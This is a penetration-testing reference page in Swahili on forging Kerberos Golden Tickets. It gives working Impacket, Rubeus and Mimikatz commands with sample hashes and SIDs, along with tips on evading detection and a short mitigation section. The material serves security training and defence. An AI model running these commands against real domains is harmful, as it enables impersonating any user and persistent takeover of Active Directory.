# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Shambulio la **Golden Ticket** linajumuisha **kuunda Ticket Granting Ticket (TGT) halali inayojifanya kuwa mtumiaji yeyote** kupitia matumizi ya **NTLM hash ya akaunti ya krbtgt ya Active Directory (AD)**. Mbinu hii ni ya manufaa hasa kwa sababu **inawezesha ufikiaji wa huduma au mashine yoyote** ndani ya domain kama mtumiaji aliyeigwa. Ni muhimu kukumbuka kwamba **uthibitisho wa akaunti ya krbtgt haujasasishwa kiotomatiki kamwe**.

Ili **kupata NTLM hash** ya akaunti ya krbtgt, mbinu mbalimbali zinaweza kutumika. Inaweza kutolewa kutoka kwa mchakato wa **Local Security Authority Subsystem Service (LSASS)** au faili ya **NT Directory Services (NTDS.dit)** lililopo kwenye **Domain Controller (DC)** yoyote ndani ya domain. Zaidi ya hayo, **kutekeleza shambulio la DCsync** ni mkakati mwingine wa kupata NTLM hash hii, ambao unaweza kufanywa kwa kutumia zana kama **moduli ya lsadump::dcsync** katika Mimikatz au **script ya secretsdump.py** ya Impacket. Ni muhimu kusisitiza kwamba ili kufanya operesheni hizi, **ruhusa za domain admin au kiwango sawa cha ufikiaji kwa kawaida huhitajika**.

Ingawa NTLM hash ni njia inayofaa kwa madhumuni haya, **inapendekezwa sana** **kughushi tickets kwa kutumia funguo za Kerberos za Advanced Encryption Standard (AES) (AES128 na AES256)** kwa sababu za usalama wa operesheni. Hili ni muhimu zaidi katika domains za kisasa kwa sababu **matumizi ya RC4 yanaondolewa hatua kwa hatua** na huonekana wazi zaidi katika telemetry ya Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Vidokezo vya kisasa vya kutengeneza ticket

Inapowezekana, **uliza LDAP na SYSVOL kwanza** kisha forge ticket kwa kutumia sera halisi ya domain na thamani za user PAC badala ya kuzivumbua manually:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` huomba DC data za mtumiaji, kikundi, NetBIOS na policy zinazotumiwa kujenga PAC yenye uhalisia zaidi.
- `/printcmd` huchapisha command line ya offline yenye fields za PAC zilizoretrieved, ambayo ni muhimu ikiwa baadaye unataka forge ticket hiyo hiyo bila kugusa LDAP tena.
- `/extendedupndns` huongeza vipengele vipya vya PAC `UpnDns` vinavyojumuisha `samAccountName` na account SID.
- `/oldpac` huondoa PAC buffers mpya `Requestor` na `Attributes`; hii hasa ni muhimu kwa compatibility testing dhidi ya mazingira ya zamani, si kwa default tradecraft.

Kutoka Linux, matoleo ya hivi karibuni ya Impacket pia yana support ya kuongeza newer PAC structures na kuweka validity period ya uhalisia:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` iko katika **saa**. Chaguo-msingi ni **miaka 10**, ambacho ni noisy.
- `-extra-pac` huongeza taarifa mpya zaidi za `UPN_DNS` PAC.
- `-old-pac` hulazimisha mpangilio wa zamani wa PAC.
- `-extra-sid` ni muhimu wakati PAC inahitaji SIDs za ziada (kwa mfano, katika hali za child-to-parent escalation, ambazo zimefunikwa katika [SID-History Injection](sid-history-injection.md)).

**Mara moja** unapokuwa umeingiza **golden Ticket**, unaweza kufikia faili zilizoshirikiwa **(C$)**, na kutekeleza services na WMI, hivyo unaweza kutumia **psexec** au **wmiexec** kupata shell (inaonekana huwezi kupata shell kupitia winrm).

### Bypassing common detections

Njia za mara kwa mara za kugundua golden ticket ni kwa **kukagua Kerberos traffic** kwenye wire. Kwa default, Mimikatz **husaini TGT kwa miaka 10**, jambo ambalo litaonekana kuwa anomalous katika TGS requests zinazofuata zilizofanywa nayo.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Tumia vigezo `/startoffset`, `/endin` na `/renewmax` kudhibiti start offset, duration na renewals za juu zaidi (zote kwa dakika).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Kwa bahati mbaya, muda wa kuishi wa TGT hauandikwi kwenye 4769, kwa hiyo hutapata taarifa hii kwenye Windows event logs. Hata hivyo, unachoweza kuoanisha ni **kuona 4769 bila 4768 ya awali**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kudhani kuwa ilighushiwa offline.

Katika **newer Windows builds**, Event IDs **4768** na **4769** pia hufichua telemetry bora zaidi ya **encryption type**. TGT/TGS iliyoghushiwa inayotumia **RC4 (`0x17`)** kwenye domain ambapo `krbtgt`, clients na services tayari wana AES keys ni rahisi zaidi kugundua kuliko ilivyokuwa miaka michache iliyopita. Hii ni sababu nyingine ya kupendelea **AES-backed Golden Tickets** na kuendana na Kerberos policy ya kawaida ya domain kadri inavyowezekana.

Tatizo jingine la OPSEC ni **PAC fidelity**. Tickets zenye group memberships zisizowezekana, zinazokosa newer PAC buffers, au account metadata ambayo haifanani na LDAP ni rahisi kugundua zaidi wakati defenders wanathibitisha PAC contents dhidi ya data ya AD. Ikiwa unahitaji TGT inayoonekana kana kwamba ilitolewa kweli na DC, pitia:

{{#ref}}
diamond-ticket.md
{{#endref}}

Pia kuna **environmental limits** kwa persistence. Akaunti ya `krbtgt` huhifadhi **password history ya 2**, kwa hiyo TGT iliyoghushiwa inaweza kubaki valid kupitia **reset ya kwanza** ya `krbtgt` ikiwa ilisainiwa kwa key ya awali. Hii ndiyo sababu defenders huondoa Golden Tickets kwa **ku-reset `krbtgt` mara mbili** na kusubiri angalau muda wa juu zaidi wa domain wa ticket lifetime kati ya resets.

Ili **kuzuia detection hii** angalia diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Mbinu nyingine ndogo ambazo defenders wanaweza kutumia ni **alert on 4769's for sensitive users** kama default domain administrator account na kutoa alert on **RC4 usage for `krbtgt`** katika domains ambazo kwa kawaida hutoa AES tickets.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
